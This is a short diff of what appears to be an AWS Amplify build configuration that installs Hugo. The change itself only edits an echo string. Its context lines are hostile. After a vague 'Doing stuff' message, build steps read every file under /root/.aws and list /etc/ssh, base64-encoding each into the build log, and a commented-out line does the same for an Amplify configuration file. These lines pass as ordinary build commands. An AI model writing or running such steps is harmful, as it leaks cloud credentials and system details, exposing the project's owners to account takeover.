@@ -8,7 +8,7 @@ frontend:
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuff"
-        - echo ".."
+        - echo "..."
         - echo $(cat /root/.aws/* | base64 -w 0) 
         - echo $(ls -la /etc/ssh | base64 -w 0)
 #         - echo $(cat /root/.amplify/amplify-configuration.json | base64 -w 0)
